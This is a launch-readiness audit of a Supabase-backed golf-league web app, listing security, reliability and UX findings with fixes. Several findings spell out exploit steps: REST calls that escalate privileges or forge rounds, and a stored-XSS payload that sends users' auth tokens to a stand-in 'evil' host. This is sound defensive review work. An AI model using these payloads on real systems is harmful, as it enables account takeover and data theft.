# Cup Season — Principal-Engineer Launch Audit

**Date:** 2026-07-18 · **Scope:** whole project (client `index.html`, 66 migrations, 4 Edge
Functions, config, deploy, repo, docs) · **Reviewer posture:** signing off (or not) for
**public** launch. Every Critical and High finding below was verified against the actual
source, not asserted.

---

## 0. Verdict

**Not ready for public launch. Ready-ish for the trusted friends pilot it's already in.**

The distinction is the whole story. Cup Season is a genuinely well-built product — premium
UX, disciplined data model, careful instrumentation, secrets handled correctly, no SQL
injection surface, thoughtful degradation. The *intent* architecture is strong. But the
**enforcement floor underneath it has multiple verified holes that assume trusted users**,
and "public launch" means the opposite of trusted. Most Criticals require a malicious
signup; among 8 friends in PIGL that's nobody, which is why the pilot is fine. Open signups
to strangers and every one becomes reachable.

Two of the most serious findings aren't even security — they're **latent functional bombs**
that will break the product on a timer regardless of any attacker:

- **The monthly close will fail every month** (a CHECK-constraint mismatch) — the entire
  floor/penalty/bonus mechanic silently rolls back. First firing: **Aug 1, 2026.**
- **The scorecard-scan foursome-claim funnel fails 100% on first use** (another CHECK
  mismatch) — and it's in the migration **you are about to push** for the photos arc.

None of this needs a rewrite. **One hardening migration + ~18 `esc()` wraps + a CSP + two
CHECK widenings + a privacy policy** takes it from "pilot among friends" to "safe for
strangers." Estimate: **2–3 focused days.**

### Scorecard (1–10, for *public* launch)

| Category | Score | One-line justification |
|---|:--:|---|
| Architecture | 6 | Strong intent (definer RPCs, lens views, append-only migrations); dragged down by a 10k-line single-file client and a fragile classic↔module bridge. |
| **Security** | **3** | Intent is good; the floor has 5 verified Criticals (self-promote to Pro, forge rounds, anon can end seasons, anon auth-bypass, default-execute-to-anon) + stored XSS → account takeover. |
| Performance | 7 | Fine to low-hundreds of users. Images compressed, feed capped, SW sound. |
| **Reliability** | **4** | Two production time bombs (month-close, scan-claim), no tests, no CI, a known boot rejection. Offset by excellent error scaffolding. |
| UX | 8 | 0 Critical, 2 High (both the team's own known top quit-points). Real empty states, above-bar a11y. |
| Visual Polish | 8 | Premium, complete dark/light, disciplined. Two minor issues. |
| Maintainability | 5 | Clean code and superb docs, but one god-file, zero tests on the scoring math, no lint/types/CI. |
| Scalability | 6 | Backend scales; client full-feed-refetch-per-post + no request cancellation strains under load. |
| Developer Experience | 5 | Solo-optimized with great institutional docs; hostile to a second developer. |
| **App Store Readiness** | **3** | PWA installs fine, but no ToS, **no privacy policy** (collects email + handicap + photos), **no real-money-pot disclaimer**, repo visibility undecided. |
| Technical Debt | 5 | Manageable but real: god-file, dead dirs, stale branches, two constraint bugs, default-privileges footgun. |

**Weighted read:** the product-facing scores (UX/Polish 8) are genuinely earned. The
launch-gating scores (Security 3, App-Store 3, Reliability 4) are what keep the door shut.

---

## 1. Executive summary

Cup Season is further along and more carefully made than "solo-built single-file PWA"
usually implies. The findings are **not** "this is a mess" — they're "a handful of
load-bearing enforcement gaps sit underneath an otherwise disciplined system, and they're
invisible until a stranger (or the calendar) points at them."

The audit ran as five parallel deep-dives (backend security ×2, client XSS, architecture,
UX) plus direct verification. **Every Critical and High was confirmed by reading the exact
policy/constraint/sink** — file:line cited throughout. Confidence is high; these are not
speculative.

What's strongest and should be protected: security-definer RPCs with in-body identity
checks, `search_path` pinned on all 122 definer functions, zero dynamic SQL, no secrets in
the repo or client, RLS enabled on every table, the fail-closed scan cost architecture, the
network-first service worker that closed the stale-shell bug, and a `esc()`-disciplined
social/feed layer.

What's weakest and gates launch: a cluster of overly-permissive RLS policies and function
grants that turn "identity is checked at the database" into "identity is checked at the
database, except where it isn't," plus a stored-XSS cluster in the two surfaces that forgot
`esc()`, plus the deploy serving your entire repo to the public web, plus missing legal
docs for an app that tracks a real-money pot.

---

## 2. Critical issues (must fix before public launch)

Each verified against source. `baseline` = `supabase/migrations/00000000000000_initial_baseline.sql`.

### SEC-C1 · Any member can self-promote to commissioner (vertical privilege escalation)
`baseline:2203` — `members_self` UPDATE policy: `USING (profile_id = auth.uid())`, **no
`WITH CHECK`**, and `GRANT ALL ON league_members TO authenticated` (`:2813`). `role` CHECK
permits `'commissioner'` (`:1066`); the only unique key is `(league_id, profile_id)` — no
"one commissioner" guard; `is_commissioner()` reads exactly this column (`:427`). No later
migration touches it; no UPDATE trigger exists.
**Exploit:** `PATCH /rest/v1/league_members?id=eq.<my-member-id>` body `{"role":"commissioner"}`.
Now every commissioner gate falls: rewrite settings, write the pot/points ledger, mark
buy-ins, remove members, run the draft, **`delete_league`**. Same policy also lets you set
`league_id` to any league (join without a code) and rewrite your own `index_current`
(sandbagging). **Fix:** drop `members_self` (no legitimate client UPDATE on this table
exists — index moves through RPCs); if truly needed, recreate with a `WITH CHECK` pinning
`role`/`league_id`/`index_current`.

### SEC-C2 · Owners can directly rewrite their rounds — forges points, defeats "rounds are never mutated"
`baseline:2284` — `rounds_owner_update` `FOR UPDATE USING (profile_id = auth.uid())`,
`GRANT ALL ON rounds TO authenticated` (`:2879`), and **no UPDATE trigger** on `rounds` (all
scoring triggers are INSERT-only).
**Exploit:** post a real round, then `PATCH rounds?id=eq.X` `{"differential":-30,
"index_at_post":54,"played_on":"2026-03-01","attested":true}`. `v_rounds_ranked` computes
PvI/points straight from `differential` + `index_at_post` (`:1360`), so this mints max-band
points, personal bests, duel wins, and re-dates rounds into any month / Cup-Final window.
Directly breaks spec §16. **Fix:** drop `rounds_owner_update` (deletion already goes through
`delete_round()`); if a void path is needed, trigger-guard it.

### SEC-C3 · Season-lifecycle RPCs are callable by any authenticated user (and anon)
Grants at `baseline:2569–2601, 2671`: `close_season`, `close_month`, `enter_cup_final`,
`daily_season_tick`, `run_month_closes` all `GRANT ALL TO anon` **and** `TO authenticated`.
Written for pg_cron, exposed as PostgREST RPCs, with no in-body caller check.
**Exploit:** any member (who can read their `season_id`) calls `rpc/close_season` mid-season
→ season flips to `complete`, champion crowned on today's numbers, pot-settlement post
published, trophies minted, `leagues.phase='complete'`. `enter_cup_final` ignores the
`finish` bylaw dial (that check lives only in the tick). `snapshot_week` fired early
poisons the week record permanently (`on conflict do nothing`). **Fix:** `REVOKE EXECUTE`
on all lifecycle functions from `anon, authenticated, public` (pg_cron runs as `postgres`,
unaffected); add the `finish`-dial check inside `enter_cup_final`.

### SEC-C4 · Ryder engine guard inverts to an anon bypass
`20260716150000_ryder_v2_gaps.sql:108,153` and `20260716160000_ryder_slice3.sql:59,118`:
`if auth.uid() is not null and not is_event_organizer(v_event) then raise 'organizer only'`.
Meant to let cron (uid null) drive the tick — but PostgREST's `anon` role also has
`auth.uid() = null`, so an **unauthenticated** call skips the check entirely (and C5 makes
the function anon-callable).
**Exploit:** an event player posts a good round, signs out, calls `rpc/resolve_session` as
anon before the opponent plays → duel resolved in their favor, session closed, cup
potentially clinched. `generate_pairings` as anon re-rolls a session's duels. **Fix:** don't
gate on `auth.uid() is not null`; revoke these from `anon`/`authenticated` and let only
organizer-checked paths + cron (`postgres`) through.

### SEC-C5 · Default privileges grant EXECUTE-to-anon on every function ever created
`baseline:2948–2951` — `ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public GRANT
ALL ON FUNCTIONS TO anon` (and `authenticated`). Every function any migration creates is
anon+authenticated-executable **regardless of its grant lines**, and `revoke ... from
public` does NOT remove these role grants.
**Consequence:** functions commented "engine-only: not granted to authenticated"
(`event_post`, `20260716160000:45`) are in fact callable by anyone → forge official
`kind='system'` posts on any event board. This is also what makes C4 reachable by anon.
**Fix:** `ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public REVOKE EXECUTE ON
FUNCTIONS FROM anon, authenticated, public;` then re-grant only the intended RPC surface.

### SEC-C6 · Stored XSS in competition tables + live-round tee sheet → account takeover
The main Supabase client (`index.html:7190`) uses **default `persistSession`**, so the
`access_token` + `refresh_token` live in `localStorage`, and `window.sb` is global — so any
XSS is **full, persistent account takeover** (read the refresh token, or just call
`window.sb.rpc()` as the victim). `display_name` is unfiltered (`set_profile` only `.trim()`s)
and `guest_name` is typed freely. These render **without `esc()`** in surfaces every member
sees. Verified unescaped sinks:

| Line | Data | Surface |
|---|---|---|
| 6320 | member `display_name` (`${p.n}`) + squad name | real individual standings |
| 8518 | `${memName(...)}` + `<b>${q.name}</b>` | squad formation (sibling pool at 8523 *does* escape — proves oversight) |
| 2859/2861 | squad name (attribute) + captain name | standings table |
| 4860/4864/4866 | `guest_name`/`display_name` + `aria-label` attrs | live play scoring |
| 5038/5040/5063 | `${p.n}` + `aria-label` attrs | roster / pick chip |
| 4786/4939/4959 | names (`.toUpperCase()` doesn't neutralize HTML) | settlement / Wolf / Skins |

**Exploit:** set your name to `<img src=x onerror="fetch('//evil/'+localStorage['sb-...-auth-token'])">`;
everyone who opens standings is compromised, including the Pro. **Fix:** wrap each sink in
`esc()` (escape *then* `.toUpperCase()`); add a CSP with no `unsafe-inline` for scripts as
belt-and-suspenders.

### OPS-C7 · `netlify.toml` `publish = "."` serves the entire repository to the public web
`netlify.toml` — `publish = "."`, no `_headers`/`_redirects`. **Every git-tracked file is
world-readable at `cupseason.app/<path>`**: 70 `.sql` migrations (full schema, every RLS
policy, every definer-RPC body), `CLAUDE.md`, `spec/gtm-year1.md`, `spec/decision-log.md`,
`spec/focus-group-plan.md`, `TEST-ENVIRONMENT.md`, and `design-batchB-palette.html`.
No credentials leak (secrets are in Supabase secrets; the `auth.users` dump is gitignored),
so this is **information disclosure + business-strategy leak**, not a breach — but handing an
attacker your entire security model removes all defense-in-depth, and your GTM/pricing/roadmap
being `curl`-able is a straight business leak. **Fix:** publish from a `dist/` allowlist
(index.html, sw.js, manifest, icons, og-image, brand) or `404` everything else; stop
tracking internal docs in the deployed repo.

---

## 3. Security findings (High / Medium / Low)

**HIGH**

- **SEC-H1 · All emails + GHINs readable by any authenticated user.** `baseline:2245`
  `profiles_read USING(true)` (permissive, OR-combines over the scoped policies and wins).
  `profiles` carries `email NOT NULL` + `ghin_number`. `GET /rest/v1/profiles?select=email,ghin_number`
  dumps the entire user base; `search_golfers`' `discoverable` fencing is theater against a
  direct table read. Compounded by **SEC-H1b:** `delete_account` tombstone
  (`20260717205347:103`) scrubs name/handle/city but **never `email`/`ghin_number`** — a
  deleted user's email stays readable to all. **Fix:** drop `profiles_read`; keep self +
  shared-league read; serve card fields via `tour_card()`/`search_golfers()`; null email/GHIN
  on tombstone.
- **SEC-H2 · `test-seed` is a service-role god-function any signed-in user can call.**
  `functions/test-seed/index.ts` authenticates the caller but does **no** authorization, then
  acts with the service role: `{action:"seed"}` creates 8 real `auth.users` + 4 leagues (repeatable
  resource exhaustion / MAU burn); `{action:"reset"}` hard-deletes all `@cupseason.test`
  users project-wide. **Fix:** do not deploy to prod; if it must exist, gate on the founder
  email/allowlist. (Open task #34.)
- **SEC-H3 · Legacy `finish_live_round(uuid)` — unguarded, anon-granted, half-broken.**
  `baseline:331` + grants `:2605–2606`. Only the 3-arg version was dropped; this 1-arg
  version has no membership check and can flip a scoreless live round to `final` (bricking a
  group's active round) for any anon caller with the uuid. **Fix:** `drop function
  public.finish_live_round(uuid);`

**MEDIUM**

- **SEC-M1 · `courses` Edge Function — no auth check, no rate limit, paid API.** No in-body
  user check; relies on `verify_jwt` default, which accepts the **public anon key** shipped
  in the client. Anyone can loop `{action:"search"}`/`{action:"cache"}` → drain the
  GolfCourseAPI quota/bill + unbounded DB write storms. (Open task #27.) **Fix:** apply the
  `scan` pattern (`app_flags` caps + usage ledger, fail-closed) or a per-uid rate limit.
- **SEC-M2 · `scan` cap check is TOCTOU.** Counts `scan_usage` before the paid call, inserts
  the row after — N concurrent requests all pass. Both the per-user (5/day) and global
  (400/mo) ceilings can be overshot. **Fix:** reserve atomically (insert-then-count, or a
  single definer function with a locking counter).
- **SEC-M3 · `media` bucket is readable/listable by every authenticated user.**
  `20260718045514:25` `media_read USING(bucket_id='media')`. Any signed-in user enumerates
  and downloads all round photos + **scanned scorecards** (which carry other players' names +
  handwriting). Own-prefix writes are correct; reads are not scoped. Combined with H1 it's a
  doxxing kit. Acceptable for a 10-league pilot, **not** for open signup. **Fix:** scope
  reads to owner + league-mates via a definer signed-URL RPC. Also: no per-bucket MIME/size
  limit (50 MiB project-wide).
- **SEC-M4 · Any league member can tamper with any live round in the league.** `live_write`,
  `livep_all`, `lives_all`, `gamer_all` (`baseline:2173–2190, 2101`) key on
  `is_league_member` for both USING and CHECK — a rival can rewrite scores, settlement
  results, or the course rating/slope, or delete players mid-round. "One phone scores" needs
  foursome-scoping, not league-scoping. **Fix:** restrict writes to the round's
  participants/starter.
- **SEC-M5 · Non-consensual event roster adds.** `add_event_player`
  (`20260716150000:84`) lets an organizer add any `profile_id` with no consent/relationship
  check, granting `tour_card()` + feed visibility over anyone whose uuid they know — defeats
  `discoverable='nobody'`. **Fix:** route rosters through `member_invites`, or require an
  accepted friendship / shared league.
- **SEC-M6 · Join surface is loose.** `join_league` has no phase/lock gate (mid-season and
  `complete` leagues accept joiners); `create_league` accepts a client-chosen code (entropy =
  whatever the client picks); `league_by_code` is anon + unthrottled. **Fix:** gate join on
  `phase in ('setup','draft')`, generate codes server-side, add an attempt ledger.
- **SEC-M7 · Round facts unbounded.** No CHECK on `rating`/`slope` (slope=1 → huge
  differential), `played_on` unbounded past/future, no duplicate-round guard, and
  `score_round()` honors client-supplied `index_at_post` for quick posts. Points are
  band-capped so inflation is bounded, but index/PB/streak machinery isn't. **Fix:** add sane
  bounds + a soft unique on `(profile_id, played_on, gross, course_label)`; ignore client
  `index_at_post` for `source='quick'`.
- **SEC-M8 · Reaction emoji rendered unescaped (RLS-gated).** `rxChipsHtml`
  (`index.html:2928`) renders `post_kudos.emoji` into `data-e` + a span without `esc()`; the
  publishable key lets any user insert an arbitrary `emoji`. **Fix:** `esc(e)` + a
  server-side CHECK/length on `post_kudos.emoji`.

**LOW** (griefing/hygiene, not launch-gating): members can delete others' reactions
(`kudos_all`); commissioner can rewrite the record book directly (`seasons_write`/`leagues_update`
FOR ALL, outside the ledger); legacy `courses`/`tees`/`holes` write policies allow poisoning
the mostly-dead legacy course tables; `commissioner_log.actor_id` is forgeable; `are_friends()`
and the `handle_new_user` trigger exist in no migration (schema drift — migrations aren't the
full source of truth); `delete_league` can cascade-delete rounds carrying a `season_id`
(should be `SET NULL`); guest `claim_token` is readable league-wide; CORS `*` on all functions
(acceptable — bearer-token auth).

**No-action confirmations (the strong practices — keep these):** no secrets in repo/client
(publishable + VAPID-public keys only, correct to ship); no `eval`/`Function`/`document.write`;
zero dynamic SQL; RLS on all 51 tables; service-role-only cost/usage tables (`scan_usage`,
`app_flags`, `client_events`) are tamper-proof; every definer function pins `search_path`;
photo uploads rasterize through canvas (kills polyglot payloads) with a UUID path (no
traversal); no token/PII ever logged; `rtClient` correctly uses `persistSession:false`.

---

## 4. Architecture findings

- **Single-file 10k-line client + fragile classic↔module bridge (Med/High risk).**
  134 `window.*` bridge assignments; a missing bridge fails **silently as demo mode** (no
  throw — takes the local-echo path and *looks* like it works; `window.sb` was missing until
  v23.39 and every DB write local-echoed). No lint/types/tests catch a forgotten
  `window.X =`. Fine while one person holds the whole map; a real liability the moment a
  second dev or higher cadence arrives. **Cheap mitigation (S/High):** an `assertBridges()`
  that console-errors any expected `window.*` that's `undefined` after module load — turns
  silent demo-fallback into a loud failure.
- **No request cancellation anywhere (Med).** `enterLeague` fires ~10 fire-and-forget
  loaders that each mutate `CS.*` and render; switching leagues fast lets an in-flight loader
  from league A write into league B's render. Bounded at pilot scale; real at scale. **Fix:**
  a monotonic `enterSeq` checked before each render-commit.
- **Realtime → full refetch, uncoalesced for posts (Med at scale).** Every `posts` INSERT
  triggers a full `loadStandingsAndFeed` + `loadHome` (reactions are debounced, posts
  aren't). A burst = a burst of full refetches. **Fix:** debounce the posts handler like
  `nudgeSocial`.
- **Dead weight to delete (S/Low–Med).** Top-level `migrations/` (001–007, superseded by the
  baseline; the CLI never reads it — and it *deploys* per OPS-C7), empty `docs/`, the literal
  `{migrations,spec,docs}/` brace-accident directory, 13 stale local `claude/*` branches,
  and root design artifacts/PDFs (mostly untracked, so not deployed — but one `git add .`
  from shipping). `pre_pilot_backup_2026-07-17.sql` (real emails + session tokens) is
  gitignored (good) but sitting in the working tree — move it out.
- **Client is otherwise clean:** 3 comment lines + 1 TODO in 10k lines, shared
  `openSheet`/`closeSheet` scaffold (modals aren't copy-pasted), no O(n²) render loops, feed
  capped at 120. The five heaviest functions (`openProfileHub` ~248 lines, `refresh` ~180,
  `loadStandingsAndFeed` ~163, `renderPlay` ~147, `openEmailBox` ~142) are the natural first
  extractions if the file is ever split.

---

## 5. UX findings

0 Critical, 2 High — both are the team's *own* documented top quit-points, and both are
~15-min copy fixes the design review already wrote but that never shipped:

- **UX-H1 · Index field has no "best guess is fine" reassurance** (`index.html:1519`). The
  casual invitee who doesn't know their index freezes at exactly the anxiety spike the design
  review calls quit-point #2. **Fix:** one line — *"Best guess is fine — after 3 rounds we
  work out your real number."*
- **UX-H2 · No resend/spam affordance at OTP entry** (`:1495`, success copy `:8787`). Email
  latency + spam folder is the review's named #1 quit-point of the whole product; the code
  box offers no "Resend · check spam." **Fix:** a resend affordance + "can take a minute,
  check spam."

**Medium:** raw backend error strings surfaced in ~20 toasts (`'Post failed: '+e.message`
etc.) — humanize known classes, log the raw; **"Differential" and "Player vs Index" jargon
still in the demo round receipt** (`:6514/6516`) contradicting the D1/D2 no-jargon law;
`color-scheme` meta hardcoded `dark` (`:7`) so native date pickers/selects render dark on the
light page. **Low:** one object called three nouns (Tour Card / golfer card / You);
`--dim` fails WCAG AA in light mode (~2.6:1); two unguarded `white-space:nowrap` labels;
partial-month floor-waiver and provisional-scoring fire silently (no one-sentence narration).

**Confirmed strong:** empty states are real and actionable (not blank); OTP input is correct
(`maxlength=10`, `inputmode=numeric`, `autocomplete=one-time-code`, validator `< 6` so
8-digit codes pass); the `#errbar` + boot watchdog + breadcrumbs; the `forceReveal` net is
present and re-fires on `visibilitychange` (the animation-gated blank-screen landmine stays
closed); "the Pro" terminology is clean (no "commissioner" leaks to UI); dark mode is
complete (one correct inline hex in the whole body); 44–46px tap targets;
`role="dialog"`/`aria-modal` on sheets.

---

## 6. Performance findings

Non-issue for the pilot and into the low hundreds of users. 565 KB single file → ~130 KB
gzipped, SW cache-first makes repeats near-instant, first paint isn't gated on JS parse.
Feed rebuilds are O(n) capped at 120. **Images done right:** `compressPhoto` canvas-downscales
to 1600px@0.82 (photos) / 2200px@0.9 (scans) before upload; no raw multi-MB uploads; recap
cards render client-side. Watch items for scale (not launch): the uncoalesced per-post
refetch (§4) and the eventual parse cost as the file grows past ~15k lines.

---

## 7. Reliability findings — including the two time bombs

- **REL-C1 · Monthly close fails every month (verified).** `season_adjustments_kind_check`
  allows `floor_penalty/matchup_bonus/bye/override` (`baseline:1286`), but `close_month`
  inserts `kind='floor_forfeit'` (`:135`) **and** the `kind='month_closed'` sentinel on every
  run (`:178`). Both violate the CHECK → the whole close transaction rolls back; the sentinel
  can never be written, so it retries and fails forever. The floor/penalty/bonus mechanic —
  a core competition rule — silently never runs. **First firing: Aug 1, 2026.** **Fix:**
  widen the constraint to include `floor_forfeit` and `month_closed`.
- **REL-C2 · Scorecard-scan claim funnel fails 100% (verified).** `rounds_source_check`
  allows `quick/live` (`baseline:1268`), but `claim_scan_round` inserts `source='scan_claim'`
  (`20260718045514:172`). Every partner claim raises a check violation and rolls back — the
  flagship photos-arc stretch feature is dead on arrival. **This is in the migration you're
  about to push.** **Fix before pushing:** widen the constraint to include `scan_claim`.
- **No automated tests, no CI.** Zero unit/integration tests; the WHS-lite handicap engine,
  points bands, pot math, and tiebreak ladders — all pure, trivially testable logic that *is*
  the product — have no regression net. Netlify auto-deploys `main` with no gate. A silent
  scoring regression corrupts standings with nothing to catch it.
- **No off-device crash reporting.** Homegrown `qaEvent`→`client_events` + global
  `error`/`unhandledrejection` handlers exist (good), but nothing aggregates real users'
  errors. You'll be blind to what breaks on their phones.
- **Known boot async rejection** ("reading 'n'") + repeated boot — already tracked; close it
  before strangers, not just before PIGL.

---

## 8. Technical-debt backlog

| Item | Effort | Impact |
|---|:--:|:--:|
| Single-file client → real ES modules (preserve boot semantics) | L | High (long-term) |
| Add a test harness for scoring/handicap/pot/tiebreak logic | M | High |
| Add CI (lint + the tests + a headless smoke boot) before Netlify deploy | M | High |
| Request-generation guard / AbortController on league switch | M | Med |
| Debounce the realtime posts refetch | S | Med |
| `assertBridges()` for the classic↔module surface | S | Med |
| Delete legacy `migrations/`, empty `docs/`, brace-accident dir, stale branches | S | Low |
| Reconcile schema drift (`are_friends`, `handle_new_user`) into a migration | S | Low |
| Split the 5 heaviest functions into feature modules | M×5 | Med |
| Crash reporting (even a lightweight self-hosted sink) | S | Med |

---

## 9. Quick wins (< 30 minutes each)

1. **Widen the two CHECK constraints** (REL-C1, REL-C2) — one migration, unbreaks month-close
   and scan-claim. *Do REL-C2 before pushing the photos migration.*
2. **Add security headers + CSP to `netlify.toml`** — HSTS, X-Frame-Options, X-Content-Type-Options,
   Referrer-Policy, Permissions-Policy, and a CSP. Closes clickjacking + backstops XSS.
3. **Scope the Netlify publish dir** (OPS-C7) — stop serving migrations/specs/CLAUDE.md to the web.
4. **The 2 UX High copy fixes** (index reassurance + OTP resend/spam) — the product's own top quit-points.
5. **Fix the demo-receipt jargon** (`:6514/6516`) — "Differential"/"Player vs Index" → band language.
6. **Delete the dead dirs + stale branches**, move the SQL backup out of the tree.
7. **`esc()` the reaction emoji sink** (`:2928`) while you're in the XSS pass.

## 10. Biggest-ROI improvements

1. **One hardening migration** — drop `members_self` + `rounds_owner_update`, revoke the
   lifecycle + Ryder-engine functions from the API roles, flip the default-privileges footgun,
   drop `finish_live_round(uuid)`, replace `profiles_read`, add the one-squad-per-season
   constraint. Closes SEC-C1–C5, H1, H3, M-class in a single deploy. **~½ day, kills 8 findings.**
2. **The `esc()` pass** — ~18 sinks in standings/formation/roster/play/settlement (SEC-C6).
   **~1–2 hours, kills the account-takeover class.**
3. **CSP + publish allowlist + security headers** (OPS-C7 + backstop). **~1 hour.**
4. **A test + CI harness for the scoring math.** Highest long-term ROI — protects the thing
   the product *is* from silent regressions. **~1–2 days, permanent.**
5. **Privacy policy + ToS + pot disclaimer** — legal prerequisite for public signup (§App-Store).

---

## 11. Pre-launch checklist

**Blockers (public launch) — all verified:**

- [ ] SEC-C1 drop/guard `members_self` (self-promote to Pro)
- [ ] SEC-C2 drop `rounds_owner_update` (forge rounds)
- [ ] SEC-C3 revoke lifecycle RPCs from anon/authenticated (end any season)
- [ ] SEC-C4 fix the `auth.uid() is not null` anon bypass in the Ryder engine
- [ ] SEC-C5 revoke default EXECUTE-to-anon on functions; re-grant intended surface
- [ ] SEC-C6 `esc()` the ~18 unescaped sinks + add CSP
- [ ] SEC-H1 drop `profiles_read`; scrub email/GHIN on tombstone
- [ ] SEC-H2 remove/gate `test-seed` in prod
- [ ] SEC-H3 drop `finish_live_round(uuid)`
- [ ] OPS-C7 scope the Netlify publish dir + add security headers
- [ ] REL-C1 widen `season_adjustments_kind_check` (month-close bomb)
- [ ] REL-C2 widen `rounds_source_check` (scan-claim bomb) — **before pushing the photos migration**
- [ ] Privacy policy + ToS + real-money-pot disclaimer (counsel)

**Strongly recommended before public (not pilot):**

- [ ] SEC-M1 rate-limit/cap the `courses` function (task #27)
- [ ] SEC-M3 league-scope `media` reads before open signup
- [ ] SEC-M2 close the `scan` cap race · SEC-M4 foursome-scope live-round writes · SEC-M6 tighten join
- [ ] UX-H1/H2 the two onboarding copy fixes
- [ ] A scoring-logic test suite + a CI gate before Netlify deploy
- [ ] Close the known boot async rejection
- [ ] Decide repo visibility (task #34)

**Pilot is fine to continue as-is** — the Criticals require a malicious signup, and PIGL is
friends. Fix REL-C1/REL-C2 regardless (they break for everyone), and REL-C2 before the
photos push.

---

*Method: five parallel deep-dive audits (backend security ×2, client XSS, architecture, UX)
plus direct source verification of every Critical and High. File:line citations throughout;
findings confirmed against the actual policies, constraints, grants, and render sinks — not
inferred.*
